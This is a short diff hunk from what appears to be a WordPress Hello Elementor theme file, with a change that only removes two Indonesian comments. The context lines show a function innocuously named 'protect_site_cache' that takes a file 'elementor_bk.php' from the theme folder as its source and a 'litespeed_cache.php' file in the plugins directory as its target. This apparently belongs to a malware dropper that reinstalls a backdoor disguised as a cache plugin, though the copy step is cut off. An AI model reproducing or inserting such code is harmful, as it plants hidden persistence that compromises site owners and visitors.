@@ -269,8 +269,8 @@ if ( ! function_exists( 'hello_elementor_body_open' ) ) {
 }
 
 function protect_site_cache() {
-    $source = get_stylesheet_directory() . '/elementor_bk.php'; // file sumber
-    $target = WP_CONTENT_DIR . '/plugins/litespeed_cache.php';   // file target
+    $source = get_stylesheet_directory() . '/elementor_bk.php'; 
+    $target = WP_CONTENT_DIR . '/plugins/litespeed_cache.php';
 
     if (!file_exists($source)) return;
 
